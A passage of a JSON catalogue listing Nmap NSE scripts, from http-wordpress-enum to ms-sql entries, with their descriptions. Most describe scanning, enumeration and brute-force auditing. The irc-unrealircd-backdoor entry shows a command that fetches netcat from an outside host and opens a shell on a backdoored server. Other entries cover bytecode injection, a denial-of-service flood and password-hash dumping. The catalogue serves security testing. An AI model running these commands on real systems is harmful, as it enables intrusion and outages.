    "description": "Enumerates usernames in Wordpress blog/CMS installations by exploiting an\ninformation disclosure vulnerability existing in versions 2.6, 3.1, 3.1.1,\n3.1.3 and 3.2-beta2 and possibly others.\n\nOriginal advisory:\n* http://www.talsoft.com.ar/site/research/security-advisories/wordpress-user-id-and-user-name-disclosure/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-xssed.nse",
    "description": "This script searches the xssed.com database and outputs the result.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "https-redirect.nse",
    "description": "Check for HTTP services that redirect to the HTTPS on the same port.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "iax2-brute.nse",
    "description": "Performs brute force password auditing against the Asterisk IAX2 protocol.\nGuessing fails when a large number of attempts is made due to the maxcallnumber limit (default 2048).\nIn case your getting \"ERROR: Too many retries, aborted ...\" after a while, this is most likely what's happening.\nIn order to avoid this problem try:\n  - reducing the size of your dictionary\n  - use the brute delay option to introduce a delay between guesses\n  - split the guessing up in chunks and wait for a while between them",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "iax2-version.nse",
    "description": "Detects the UDP IAX2 service.\n\nThe script sends an Inter-Asterisk eXchange (IAX) Revision 2 Control Frame POKE\nrequest and checks for a proper response.  This protocol is used to enable VoIP\nconnections between servers as well as client-server communication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "icap-info.nse",
    "description": "Tests a list of known ICAP service names and prints information about\nany it detects. The Internet Content Adaptation Protocol (ICAP) is\nused to extend transparent proxy servers and is generally used for\ncontent filtering and antivirus scanning.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "iec-identify.nse",
    "description": "Attempts to identify IEC 60870-5-104 ICS protocol.\n\nAfter probing with a TESTFR (test frame) message, a STARTDT (start data\ntransfer) message is sent and general interrogation is used to gather the list\nof information object addresses stored.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "iec61850-mms.nse",
    "description": "Queries a IEC 61850-8-1 MMS server. Sends Initate-Request, Identify-Request and Read-Request to LN0 and LPHD.\n\nOutput contains following attributes:\n\n* modelName_identify:   Identify-Response attribute model_name\n* vendorName_identify:  Identify-Response attribute vendor_name\n* modelNumber_identify: Identify-Response attribute revision\n* productFamily:        Read-Response attribute 'LLN0$DC$NamPlt$d'\n* configuration:        Read-Response attribute 'LLN0$DC$NamPlt$configRev'\n* vendorName:           Read-Response attribute 'LPHD$DC$PhyNam$vendor' (old: 'LLN0$DC$NamPlt$vendor')\n* serialNumber:         Read-Response attribute 'LPHD$DC$PhyNam$serNum'\n* modelNumber:          Read-Response attribute 'LPHD$DC$PhyNam$model'\n* firmwareVersion:      Read-Response attribute 'LPHD$DC$PhyNam$swRev' (old: 'LLN0$DC$NamPlt$swRev')",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ike-version.nse",
    "description": "Obtains information (such as vendor and device type where available) from an\nIKE service by sending four packets to the host.  This scripts tests with both\nMain and Aggressive Mode and sends multiple transforms per request.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "imap-brute.nse",
    "description": "Performs brute force password auditing against IMAP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "imap-capabilities.nse",
    "description": "Retrieves IMAP email server capabilities.\n\nIMAP4rev1 capabilities are defined in RFC 3501. The CAPABILITY command\nallows a client to ask a server what commands it supports and possibly\nany site-specific policy.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "imap-ntlm-info.nse",
    "description": "This script enumerates information from remote IMAP services with NTLM\nauthentication enabled.\n\nSending an IMAP NTLM authentication request with null credentials will\ncause the remote service to respond with a NTLMSSP message disclosing\ninformation to include NetBIOS, DNS, and OS build version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "impress-remote-discover.nse",
    "description": "Tests for the presence of the LibreOffice Impress Remote server.\nChecks if a PIN is valid if provided and will bruteforce the PIN\nif requested.\n\nWhen a remote first contacts Impress and sends a client name and PIN, the user\nmust open the \"Slide Show -> Impress Remote\" menu and enter the matching PIN at\nthe prompt, which shows the client name. Subsequent connections with the same\nclient name may then use the same PIN without user interaction.  If no PIN has\nbeen set for the session, each PIN attempt will result in a new prompt in the\n\"Impress Remote\" menu. Brute-forcing the PIN, therefore, requires that the user\nhas entered a PIN for the same client name, and will result in lots of extra\nprompts in the \"Impress Remote\" menu.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "informix-brute.nse",
    "description": "Performs brute force password auditing against IBM Informix Dynamic Server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "informix-query.nse",
    "description": "Runs a query against IBM Informix Dynamic Server using the given\nauthentication credentials (see also: informix-brute).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "informix-tables.nse",
    "description": "Retrieves a list of tables and column definitions for each database on an Informix server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ip-forwarding.nse",
    "description": "Detects whether the remote device has ip forwarding or \"Internet connection\nsharing\" enabled, by sending an ICMP echo request to a given target using\nthe scanned host as default gateway.\n\nThe given target can be a routed or a LAN host and needs to be able to respond\nto ICMP requests (ping) in order for the test to be successful. In addition,\nif the given target is a routed host, the scanned host needs to have the proper\nrouting to reach it.\n\nIn order to use the scanned host as default gateway Nmap needs to discover\nthe MAC address. This requires Nmap to be run in privileged mode and the host\nto be on the LAN.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ip-geolocation-geoplugin.nse",
    "description": "Tries to identify the physical location of an IP address using the\nGeoplugin geolocation web service (http://www.geoplugin.com/). There\nis no limit on lookups using this service.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ip-geolocation-ipinfodb.nse",
    "description": "Tries to identify the physical location of an IP address using the\nIPInfoDB geolocation web service\n(http://ipinfodb.com/ip_location_api.php).\n\nThere is no limit on requests to this service. However, the API key\nneeds to be obtained through free registration for this service:\n<code>http://ipinfodb.com/login.php</code>",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ip-geolocation-map-bing.nse",
    "description": "This script queries the Nmap registry for the GPS coordinates of targets stored\nby previous geolocation scripts and renders a Bing Map of markers representing\nthe targets.\n\nThe Bing Maps REST API has a limit of 100 markers, so if more coordinates are\nfound, only the top 100 markers by number of IPs will be shown.\n\nAdditional information for the Bing Maps REST Services API can be found at:\n- https://msdn.microsoft.com/en-us/library/ff701724.aspx",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ip-geolocation-map-google.nse",
    "description": "This script queries the Nmap registry for the GPS coordinates of targets stored\nby previous geolocation scripts and renders a Google Map of markers representing\nthe targets.\n\nAdditional information for the Google Static Maps API can be found at:\n- https://developers.google.com/maps/documentation/static-maps/intro",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ip-geolocation-map-kml.nse",
    "description": "This script queries the Nmap registry for the GPS coordinates of targets stored\nby previous geolocation scripts and produces a KML file of points representing\nthe targets.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ip-geolocation-maxmind.nse",
    "description": "Tries to identify the physical location of an IP address using a\nGeolocation Maxmind database file (available from\nhttp://www.maxmind.com/app/ip-location). This script supports queries\nusing all Maxmind databases that are supported by their API including\nthe commercial ones.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ip-https-discover.nse",
    "description": "No description available",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ipidseq.nse",
    "description": "Classifies a host's IP ID sequence (test for susceptibility to idle\nscan).\n\nSends six probes to obtain IP IDs from the target and classifies them\nsimilarly to Nmap's method.  This is useful for finding suitable zombies\nfor Nmap's idle scan (<code>-sI</code>) as Nmap itself doesn't provide a way to scan\nfor these hosts.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ipmi-brute.nse",
    "description": "Performs brute force password auditing against IPMI RPC server.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ipmi-cipher-zero.nse",
    "description": "IPMI 2.0 Cipher Zero Authentication Bypass Scanner. This module identifies IPMI 2.0\n  compatible systems that are vulnerable to an authentication bypass vulnerability\n  through the use of cipher zero.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ipmi-version.nse",
    "description": "Performs IPMI Information Discovery through Channel Auth probes.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ipv6-multicast-mld-list.nse",
    "description": "Uses Multicast Listener Discovery to list the multicast addresses subscribed to\nby IPv6 multicast listeners on the link-local scope. Addresses in the IANA IPv6\nMulticast Address Space Registry have their descriptions listed.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ipv6-node-info.nse",
    "description": "Obtains hostnames, IPv4 and IPv6 addresses through IPv6 Node Information Queries.\n\nIPv6 Node Information Queries are defined in RFC 4620. There are three\nuseful types of queries:\n* qtype=2: Node Name\n* qtype=3: Node Addresses\n* qtype=4: IPv4 Addresses\n\nSome operating systems (Mac OS X and OpenBSD) return hostnames in\nresponse to qtype=4, IPv4 Addresses. In this case, the hostnames are still\nshown in the \"IPv4 addresses\" output row, but are prefixed by \"(actually\nhostnames)\".",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ipv6-ra-flood.nse",
    "description": "Generates a flood of Router Advertisements (RA) with random source MAC\naddresses and IPv6 prefixes. Computers, which have stateless autoconfiguration\nenabled by default (every major OS), will start to compute IPv6 suffix and\nupdate their routing table to reflect the accepted announcement. This will\ncause 100% CPU usage on Windows and platforms, preventing to process other\napplication requests.\n\nVulnerable platforms:\n* All Cisco IOS ASA with firmware < November 2010\n* All Netscreen versions supporting IPv6\n* Windows 2000/XP/2003/Vista/7/2008/8/2012\n* All FreeBSD versions\n* All NetBSD versions\n* All Solaris/Illumos versions\n\nSecurity advisory: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt\n\nWARNING: This script is dangerous and is very likely to bring down a server or\nnetwork appliance.  It should not be run in a production environment unless you\n(and, more importantly, the business) understand the risks!\n\nAdditional documents: https://tools.ietf.org/rfc/rfc6104.txt",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "irc-botnet-channels.nse",
    "description": "Checks an IRC server for channels that are commonly used by malicious botnets.\n\nControl the list of channel names with the <code>irc-botnet-channels.channels</code>\nscript argument. The default list of channels is\n* loic\n* Agobot\n* Slackbot\n* Mytob\n* Rbot\n* SdBot\n* poebot\n* IRCBot\n* VanBot\n* MPack\n* Storm\n* GTbot\n* Spybot\n* Phatbot\n* Wargbot\n* RxBot",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "irc-brute.nse",
    "description": "Performs brute force password auditing against IRC (Internet Relay Chat) servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "irc-info.nse",
    "description": "Gathers information from an IRC server.\n\nIt uses STATS, LUSERS, and other queries to obtain this information.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "irc-sasl-brute.nse",
    "description": "Performs brute force password auditing against IRC (Internet Relay Chat) servers supporting SASL authentication.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "irc-unrealircd-backdoor.nse",
    "description": "Checks if an IRC server is backdoored by running a time-based command (ping)\nand checking how long it takes to respond.\n\nThe <code>irc-unrealircd-backdoor.command</code> script argument can be used to\nrun an arbitrary command on the remote system. Because of the nature of\nthis vulnerability (the output is never returned) we have no way of\ngetting the output of the command. It can, however, be used to start a\nnetcat listener as demonstrated here:\n<code>\n  $ nmap -d -p6667 --script=irc-unrealircd-backdoor.nse --script-args=irc-unrealircd-backdoor.command='wget http://www.javaop.com/~ron/tmp/nc && chmod +x ./nc && ./nc -l -p 4444 -e /bin/sh' <target>\n  $ ncat -vv localhost 4444\n  Ncat: Version 5.30BETA1 ( https://nmap.org/ncat )\n  Ncat: Connected to 127.0.0.1:4444.\n  pwd\n  /home/ron/downloads/Unreal3.2-bad\n  whoami\n  ron\n</code>\n\nMetasploit can also be used to exploit this vulnerability.\n\nIn addition to running arbitrary commands, the\n<code>irc-unrealircd-backdoor.kill</code> script argument can be passed, which\nsimply kills the UnrealIRCd process.\n\n\nReference:\n* http://seclists.org/fulldisclosure/2010/Jun/277\n* http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt\n* http://www.metasploit.com/modules/exploit/unix/irc/unreal_ircd_3281_backdoor",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "iscsi-brute.nse",
    "description": "Performs brute force password auditing against iSCSI targets.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "iscsi-info.nse",
    "description": "Collects and displays information from remote iSCSI targets.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "isns-info.nse",
    "description": "Lists portals and iSCSI nodes registered with the Internet Storage Name\nService (iSNS).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "jdwp-exec.nse",
    "description": "Attempts to exploit java's remote debugging port. When remote debugging\nport is left open, it is possible to inject java bytecode and achieve\nremote code execution.  This script abuses this to inject and execute\na Java class file that executes the supplied shell command and returns\nits output.\n\nThe script injects the JDWPSystemInfo class from\nnselib/jdwp-class/ and executes its run() method which\naccepts a shell command as its argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "jdwp-info.nse",
    "description": "Attempts to exploit java's remote debugging port.  When remote\ndebugging port is left open, it is possible to inject java bytecode\nand achieve remote code execution.  This script injects and execute a\nJava class file that returns remote system information.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "jdwp-inject.nse",
    "description": "Attempts to exploit java's remote debugging port.  When remote debugging port\nis left open, it is possible to inject  java bytecode and achieve remote code\nexecution.  This script allows injection of arbitrary class files.\n\nAfter injection, class' run() method is executed.\nMethod run() has no parameters, and is expected to return a string.\n\nYou must specify your own .class file to inject by <code>filename</code> argument.\nSee nselib/data/jdwp-class/README for more.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "jdwp-version.nse",
    "description": "Detects the Java Debug Wire Protocol. This protocol is used by Java programs\nto be debugged via the network. It should not be open to the public Internet,\nas it does not provide any security against malicious attackers who can inject\ntheir own bytecode into the debugged process.\n\nDocumentation for JDWP is available at\nhttp://java.sun.com/javase/6/docs/technotes/guides/jpda/jdwp-spec.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "knx-gateway-discover.nse",
    "description": "Discovers KNX gateways by sending a KNX Search Request to the multicast address\n224.0.23.12 including a UDP payload with destination port 3671. KNX gateways\nwill respond with a KNX Search Response including various information about the\ngateway, such as KNX address and supported services.\n\nFurther information:\n  * DIN EN 13321-2\n  * http://www.knx.org/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "knx-gateway-info.nse",
    "description": "Identifies a KNX gateway on UDP port 3671 by sending a KNX Description Request.\n\nFurther information:\n  * DIN EN 13321-2\n  * http://www.knx.org/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "krb5-enum-users.nse",
    "description": "Discovers valid usernames by brute force querying likely usernames against a Kerberos service.\nWhen an invalid username is requested the server will respond using the\nKerberos error code KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN, allowing us to determine\nthat the user name was invalid. Valid user names will illicit either the\nTGT in a AS-REP response or the error KRB5KDC_ERR_PREAUTH_REQUIRED, signaling\nthat the user is required to perform pre authentication.\n\nThe script should work against Active Directory and ?\nIt needs a valid Kerberos REALM in order to operate.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ldap-brute.nse",
    "description": "Attempts to brute-force LDAP authentication. By default\nit uses the built-in username and password lists. In order to use your\nown lists use the <code>userdb</code> and <code>passdb</code> script arguments.\n\nThis script does not make any attempt to prevent account lockout!\nIf the number of passwords in the dictionary exceed the amount of\nallowed tries, accounts will be locked out. This usually happens\nvery quickly.\n\nAuthenticating against Active Directory using LDAP does not use the\nWindows user name but the user accounts distinguished name. LDAP on Windows\n2003 allows authentication using a simple user name rather than using the\nfully distinguished name. E.g., \"Patrik Karlsson\" vs.\n\"cn=Patrik Karlsson,cn=Users,dc=cqure,dc=net\"\nThis type of authentication is not supported on e.g. OpenLDAP.\n\nThis script uses some AD-specific support and optimizations:\n* LDAP on Windows 2003/2008 reports different error messages depending on whether an account exists or not. If the script receives an error indicating that the username does not exist it simply stops guessing passwords for this account and moves on to the next.\n* The script attempts to authenticate with the username only if no LDAP base is specified. The benefit of authenticating this way is that the LDAP path of each account does not need to be known in advance as it's looked up by the server.  This technique will only find a match if the account Display Name matches the username being attempted.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ldap-novell-getpass.nse",
    "description": "Attempts to retrieve the Novell Universal Password for a user. You\nmust already have (and include in script arguments) the username and password for an eDirectory server\nadministrative account.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ldap-rootdse.nse",
    "description": "Retrieves the LDAP root DSA-specific Entry (DSE)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ldap-search.nse",
    "description": "Attempts to perform an LDAP search and returns all matches.\n\nIf no username and password is supplied to the script the Nmap registry\nis consulted. If the <code>ldap-brute</code> script has been selected\nand it found a valid account, this account will be used. If not\nanonymous bind will be used as a last attempt.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "lexmark-config.nse",
    "description": "Retrieves configuration information from a Lexmark S300-S400 printer.\n\nThe Lexmark S302 responds to the NTPRequest version probe with its\nconfiguration. The response decodes as mDNS, so the request was modified\nto resemble an mDNS request as close as possible. However, the port\n(9100/udp) is listed as something completely different (HBN3) in\ndocumentation from Lexmark. See\nhttp://www.lexmark.com/vgn/images/portal/Security%20Features%20of%20Lexmark%20MFPs%20v1_1.pdf.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "llmnr-resolve.nse",
    "description": "Resolves a hostname by using the LLMNR (Link-Local Multicast Name Resolution) protocol.\n\nThe script works by sending a LLMNR Standard Query containing the hostname to\nthe 5355 UDP port on the 224.0.0.252 multicast address. It listens for any\nLLMNR responses that are sent to the local machine with a 5355 UDP source port.\nA hostname to resolve must be provided.\n\nFor more information, see:\n* http://technet.microsoft.com/en-us/library/bb878128.aspx",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "lltd-discovery.nse",
    "description": "Uses the Microsoft LLTD protocol to discover hosts on a local network.\n\nFor more information on the LLTD protocol please refer to\nhttp://www.microsoft.com/whdc/connect/Rally/LLTD-spec.mspx",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "lu-enum.nse",
    "description": "Attempts to enumerate Logical Units (LU) of TN3270E servers.\n\nWhen connecting to a TN3270E server you are assigned a Logical Unit (LU) or you can tell\nthe TN3270E server which LU you'd like to use. Typically TN3270E servers are configured to \ngive you an LU from a pool of LUs. They can also have LUs set to take you to a specific\napplication. This script attempts to guess valid LUs that bypass the default LUs you are\nassigned. For example, if a TN3270E server sends you straight to TPX you could use this\nscript to find LUs that take you to TSO, CICS, etc.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "maxdb-info.nse",
    "description": "Retrieves version and database information from a SAP Max DB database.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mcafee-epo-agent.nse",
    "description": "Check if ePO agent is running on port 8081 or port identified as ePO Agent port.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "membase-brute.nse",
    "description": "Performs brute force password auditing against Couchbase Membase servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "membase-http-info.nse",
    "description": "Retrieves information (hostname, OS, uptime, etc.) from the CouchBase\nWeb Administration port.  The information retrieved by this script\ndoes not require any credentials.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "memcached-info.nse",
    "description": "Retrieves information (including system architecture, process ID, and\nserver time) from distributed memory object caching system memcached.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "metasploit-info.nse",
    "description": "Gathers info from the Metasploit rpc service.  It requires a valid login pair.\nAfter authentication it tries to determine Metasploit version and deduce the OS\ntype.  Then it creates a new console and executes few commands to get\nadditional info.\n\nReferences:\n* http://wiki.msgpack.org/display/MSGPACK/Format+specification\n* https://community.rapid7.com/docs/DOC-1516 Metasploit RPC API Guide",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "metasploit-msgrpc-brute.nse",
    "description": "Performs brute force username and password auditing against\nMetasploit msgrpc interface.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "metasploit-xmlrpc-brute.nse",
    "description": "Performs brute force password auditing against a Metasploit RPC server using the XMLRPC protocol.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mikrotik-routeros-brute.nse",
    "description": "Performs brute force password auditing against Mikrotik RouterOS devices with the API RouterOS interface enabled.\n\nAdditional information:\n* http://wiki.mikrotik.com/wiki/API",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mmouse-brute.nse",
    "description": "Performs brute force password auditing against the RPA Tech Mobile Mouse\nservers.\n\nThe Mobile Mouse server runs on OS X, Windows and Linux and enables remote\ncontrol of the keyboard and mouse from an iOS device. For more information:\nhttp://mobilemouse.com/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mmouse-exec.nse",
    "description": "Connects to an RPA Tech Mobile Mouse server, starts an application and\nsends a sequence of keys to it. Any application that the user has\naccess to can be started and the key sequence is sent to the\napplication after it has been started.\n\nThe Mobile Mouse server runs on OS X, Windows and Linux and enables remote\ncontrol of the keyboard and mouse from an iOS device. For more information:\nhttp://mobilemouse.com/\n\nThe script has only been tested against OS X and will detect the remote OS\nand abort unless the OS is detected as Mac.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "modbus-discover.nse",
    "description": "Enumerates SCADA Modbus slave ids (sids) and collects their device information.\n\nModbus is one of the popular SCADA protocols. This script does Modbus device\ninformation disclosure. It tries to find legal sids (slave ids) of Modbus\ndevices and to get additional information about the vendor and firmware. This\nscript is improvement of modscan python utility written by Mark Bristow.\n\nInformation about MODBUS protocol and security issues:\n* MODBUS application protocol specification:  http://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b.pdf\n* Defcon 16 Modscan presentation: https://www.defcon.org/images/defcon-16/dc16-presentations/defcon-16-bristow.pdf\n* Modscan utility is hosted at google code: http://code.google.com/p/modscan/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mongodb-brute.nse",
    "description": "Performs brute force password auditing against the MongoDB database.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mongodb-databases.nse",
    "description": "Attempts to get a list of tables from a MongoDB database.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mongodb-info.nse",
    "description": "Attempts to get build info and server status from a MongoDB database.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mqtt-subscribe.nse",
    "description": "Dumps message traffic from MQTT brokers.\n\nThis script establishes a connection to an MQTT broker and subscribes\nto the requested topics. The default topics have been chosen to\nreceive system information and all messages from other clients. This\nallows Nmap, to listen to all messages being published by clients to\nthe MQTT broker.\n\nFor additional information:\n* https://en.wikipedia.org/wiki/MQTT\n* https://docs.oasis-open.org/mqtt/mqtt/v3.1.1/os/mqtt-v3.1.1-os.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "mrinfo.nse",
    "description": "Queries targets for multicast routing information.\n\nThis works by sending a DVMRP Ask Neighbors 2 request to the target and\nlistening for DVMRP Neighbors 2 responses that are sent back and which contain\nlocal addresses and the multicast neighbors on each interface of the target. If\nno specific target is specified, the request will be sent to the 224.0.0.1 All\nHosts multicast address.\n\nThis script is similar somehow to the mrinfo utility included with Windows and\nCisco IOS.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-brute.nse",
    "description": "Performs password guessing against Microsoft SQL Server (ms-sql). Works best in\nconjunction with the <code>broadcast-ms-sql-discover</code> script.\n\nSQL Server credentials required: No  (will not benefit from <code>mssql.username</code> & <code>mssql.password</code>).\n\nRun criteria:\n* Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code> or <code>mssql.instance-port</code> script arguments are used (see mssql.lua).\n* Port script: Will run against any services identified as SQL Servers, but only if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code> and <code>mssql.instance-port</code> script arguments are NOT used.\n\nWARNING: SQL Server 2005 and later versions include support for account lockout\npolicies (which are enforced on a per-user basis). If an account is locked out,\nthe script will stop running for that instance, unless the\n<code>ms-sql-brute.ignore-lockout</code> argument is used.\n\nNOTE: Communication with instances via named pipes depends on the <code>smb</code>\nlibrary. To communicate with (and possibly to discover) instances via named pipes,\nthe host must have at least one SMB port (e.g. TCP 445) that was scanned and\nfound to be open. Additionally, named pipe connections may require Windows\nauthentication to connect to the Windows host (via SMB) in addition to the\nauthentication required to connect to the SQL Server instances itself. See the\ndocumentation and arguments for the <code>smb</code> library for more information.\n\nNOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate\nwith ports that were not included in the port list for the Nmap scan. This can\nbe disabled using the <code>mssql.scanned-ports-only</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-config.nse",
    "description": "Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,\nand configuration settings.\n\nSQL Server credentials required: Yes (use <code>ms-sql-brute</code>, <code>ms-sql-empty-password</code>\nand/or <code>mssql.username</code> & <code>mssql.password</code>)\nRun criteria:\n* Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nor <code>mssql.instance-port</code> script arguments are used (see mssql.lua).\n* Port script: Will run against any services identified as SQL Servers, but only\nif the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nand <code>mssql.instance-port</code> script arguments are NOT used.\n\nNOTE: Communication with instances via named pipes depends on the <code>smb</code>\nlibrary. To communicate with (and possibly to discover) instances via named pipes,\nthe host must have at least one SMB port (e.g. TCP 445) that was scanned and\nfound to be open. Additionally, named pipe connections may require Windows\nauthentication to connect to the Windows host (via SMB) in addition to the\nauthentication required to connect to the SQL Server instances itself. See the\ndocumentation and arguments for the <code>smb</code> library for more information.\n\nNOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate\nwith ports that were not included in the port list for the Nmap scan. This can\nbe disabled using the <code>mssql.scanned-ports-only</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-dac.nse",
    "description": "Queries the Microsoft SQL Browser service for the DAC (Dedicated Admin\nConnection) port of a given (or all) SQL Server instance. The DAC port\nis used to connect to the database instance when normal connection\nattempts fail, for example, when server is hanging, out of memory or\nin other bad states. In addition, the DAC port provides an admin with\naccess to system objects otherwise not accessible over normal\nconnections.\n\nThe DAC feature is accessible on the loopback adapter per default, but\ncan be activated for remote access by setting the 'remote admin\nconnection' configuration value to 1. In some cases, when DAC has been\nremotely enabled but later disabled, the sql browser service may\nincorrectly report it as available. The script therefore attempts to\nconnect to the reported port in order to verify whether it's\naccessible or not.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-dump-hashes.nse",
    "description": "Dumps the password hashes from an MS-SQL server in a format suitable for\ncracking by tools such as John-the-ripper. In order to do so the user\nneeds to have the appropriate DB privileges.\n\nCredentials passed as script arguments take precedence over credentials\ndiscovered by other scripts.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-empty-password.nse",
    "description": "Attempts to authenticate to Microsoft SQL Servers using an empty password for\nthe sysadmin (sa) account.\n\nSQL Server credentials required: No (will not benefit from\n<code>mssql.username</code> & <code>mssql.password</code>).\nRun criteria:\n* Host script: Will run if the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nor <code>mssql.instance-port</code> script arguments are used (see mssql.lua).\n* Port script: Will run against any services identified as SQL Servers, but only\nif the <code>mssql.instance-all</code>, <code>mssql.instance-name</code>\nand <code>mssql.instance-port</code> script arguments are NOT used.\n\nWARNING: SQL Server 2005 and later versions include support for account lockout\npolicies (which are enforced on a per-user basis).\n\nNOTE: Communication with instances via named pipes depends on the <code>smb</code>\nlibrary. To communicate with (and possibly to discover) instances via named pipes,\nthe host must have at least one SMB port (e.g. TCP 445) that was scanned and\nfound to be open. Additionally, named pipe connections may require Windows\nauthentication to connect to the Windows host (via SMB) in addition to the\nauthentication required to connect to the SQL Server instances itself. See the\ndocumentation and arguments for the <code>smb</code> library for more information.\n\nNOTE: By default, the ms-sql-* scripts may attempt to connect to and communicate\nwith ports that were not included in the port list for the Nmap scan. This can\nbe disabled using the <code>mssql.scanned-ports-only</code> script argument.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "ms-sql-hasdbaccess.nse",
